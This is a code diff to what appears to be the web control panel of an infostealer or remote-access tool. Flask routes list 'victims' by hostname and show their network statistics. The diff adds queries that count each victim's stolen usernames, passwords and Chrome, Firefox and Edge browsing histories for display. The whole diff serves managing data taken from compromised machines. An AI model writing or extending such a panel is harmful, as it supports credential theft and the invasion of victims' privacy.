@@ -121,14 +121,14 @@ def settings():
 def get_victims():
     conn = get_db_connection()
     with conn.cursor(DictCursor) as cursor:
-        cursor.execute("""
-            SELECT t.*
-            FROM system_info t
+        cursor.execute(""" 
+            SELECT t.* 
+            FROM system_info t 
             INNER JOIN (
-                SELECT hostname, MAX(created_at) as max_time
-                FROM system_info
+                SELECT hostname, MAX(created_at) AS max_time 
+                FROM system_info 
                 GROUP BY hostname
-            ) grouped
+            ) grouped 
             ON t.hostname = grouped.hostname AND t.created_at = grouped.max_time
         """)
         victims = cursor.fetchall()
@@ -145,37 +145,57 @@ def overview():
 
     conn = get_db_connection()
     with conn.cursor(DictCursor) as cursor:
+        # Get victim data
         cursor.execute("SELECT * FROM system_info WHERE id = %s", (victim_id,))
         victim_data = cursor.fetchone()
 
-        cursor.execute("""
-            SELECT packets_sent, packets_recv, created_at
-            FROM system_info
-            WHERE id = %s
-            ORDER BY created_at DESC
+        # Get the latest network data (packets sent and received)
+        cursor.execute(""" 
+            SELECT packets_sent, packets_recv, created_at 
+            FROM system_info 
+            WHERE id = %s 
+            ORDER BY created_at DESC 
             LIMIT 5
         """, (victim_id,))
         network_data = cursor.fetchall()
 
+        # Get the total number of password cookies and history entries
+        cursor.execute(""" 
+            SELECT COUNT(*) AS total_passwords 
+            FROM system_info 
+            WHERE id = %s AND (usernames IS NOT NULL OR passwords IS NOT NULL)
+        """, (victim_id,))
+        total_passwords = cursor.fetchone()['total_passwords']
+
+        cursor.execute(""" 
+            SELECT COUNT(*) AS total_history 
+            FROM system_info 
+            WHERE id = %s AND (chrome_history IS NOT NULL OR firefox_history IS NOT NULL OR edge_history IS NOT NULL)
+        """, (victim_id,))
+        total_history = cursor.fetchone()['total_history']
+
     conn.close()
-    print("Victim Data:", victim_data)
-    print("Network Data:", network_data)
 
     if victim_data and network_data:
+        # Prepare data for the network chart
         labels = [row['created_at'].strftime('%Y-%m-%d %H:%M:%S') for row in network_data]
         packets_sent = [row['packets_sent'] / 1000 for row in network_data]
         packets_recv = [row['packets_recv'] / 1000 for row in network_data]
 
+        # Return the overview page with total counts for passwords and history
         return render_template(
             'overview.html', 
             victim=victim_data, 
             labels=labels, 
             packets_sent=packets_sent, 
             packets_recv=packets_recv, 
-            scale_factor=1000
+            scale_factor=1000,
+            total_passwords=total_passwords,
+            total_history=total_history
         )
     else:
         return "Network data not found", 404
+
 
 @app.route('/history')
 def history():
